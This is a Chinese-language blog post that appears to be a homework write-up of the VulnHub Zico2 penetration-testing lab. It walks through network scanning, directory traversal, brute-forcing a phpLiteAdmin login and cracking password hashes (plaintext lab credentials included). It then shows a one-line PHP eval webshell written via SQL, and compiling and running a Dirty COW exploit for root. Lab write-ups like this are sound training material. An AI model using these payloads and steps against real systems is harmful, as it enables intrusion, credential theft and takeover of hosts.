+++
title = 'Zico2靶场'
date = '2024-09-09T06:42:21+08:00'
categories = ['vulnhub']
tags = ['打靶记录']
+++

# 作业1--Zico2靶场渗透测试

## 环境搭建

靶机下载地址[zico2: 1 ~ VulnHub](https://www.vulnhub.com/entry/zico2-1,210/#release)

攻击机kali IP:192.168.26.128

网络nat即可

![image-20240907135551973](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071355055.png)

## 渗透过程

### 信息收集

先找出待测试靶机的ip

```
namp -sP 192.168.26.0/24
```

![image-20240907141136096](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071411158.png)

判断192.168.26.132就是靶机的ip。

先访问测试一下。

![image-20240907141224105](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071412264.png)

没问题可以尝试先测试一个这个网站的功能。貌似没有什么有用的功能，那就去看一下开放的端口

```
nmap -p 1-65535 192.168.26.132
```

![image-20240907142151680](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071421721.png)

可以看到开放的一些端口，但是暂时没什么用。还回到页面。

![image-20240907142247048](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071422123.png)

这里看到一个参数page，尝试目录穿越包含其他文件读取。

![image-20240907142358600](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071423634.png)

没问题，目录穿越直接就能读取文件了。

暂时不知道网站的目录位置，尝试去扫描一下网站。

```
┌──(root㉿kali)-[~/dirsearch]
└─# python dirsearch.py -u http://192.168.26.132/ -i 200-399

```

![image-20240907143004912](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071430953.png)

dbadmin应该是数据库管理后台，需要密码的呢登录，然后用的是phpLiteAdmin v1.9.3，可以尝试去找一下这个版本是否存在公开的漏洞。

![image-20240907143246033](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071432069.png)

存在php远程代码执行漏洞，但是要登录到后台，且需要有写的权限。

尝试爆破密码，直接就出来了admin

![image-20240907145627554](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071456614.png)

可以看看info表

![image-20240907152422558](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071524587.png)

账户密码 密码md5尝试解密

![image-20240907152448602](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071524641.png)

![image-20240907152511803](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071525836.png)

```
root 34kroot34
zico zico2215@
```

暂时不知道是什么账户密码(ssh登不上)

### 漏洞利用

尝试写入，发现貌似不能写入。

```
select '<?php @eval($_POST('cmd'));?>' into outfile '/usr/databases/2.php';
```

这里创建一个表 写入恶意代码。

![image-20240907160405304](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071604353.png)

![image-20240907160415093](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071604150.png)

正常执行。

这里直接蚁剑连接，查看权限

![image-20240907161726522](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071617568.png)

我们看一下home目录，有个zico用户，貌似是搭建了一个WordPress，我们去查看配置文件，得到一个数据库passwd，尝试ssh登录，

![image-20240907163931495](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071639551.png)

成功登录。

![image-20240907164010588](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071640631.png)

### 提权

看find

![image-20240907162042660](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071620682.png)

这里find没有s权限位，不能提权。

内核提权

[Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3) - Linux_x86-64 local Exploit (](https://www.exploit-db.com/exploits/33589)[exploit-db.com](https://exploit-db.com)[)](https://www.exploit-db.com/exploits/33589)

将下载的提权代码上传上去。

![image-20240907164349597](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071643637.png)

这里不知道什么原因，一直提权不上去。

![image-20240907170524382](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071705427.png)

#### 脏牛提权

先上传提权exp

```
scp "C:\Users\168\Desktop\app\dirty.c" [email protected]:/home/zico
```

![image-20240907173937805](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071739830.png)

编译运行

```
gcc -pthread dirty.c -o dirty -lcrypt
  ./dirty 123
```

![image-20240907173914729](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071739806.png)

![image-20240907174242381](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202409071742426.png)

成功拿到flag
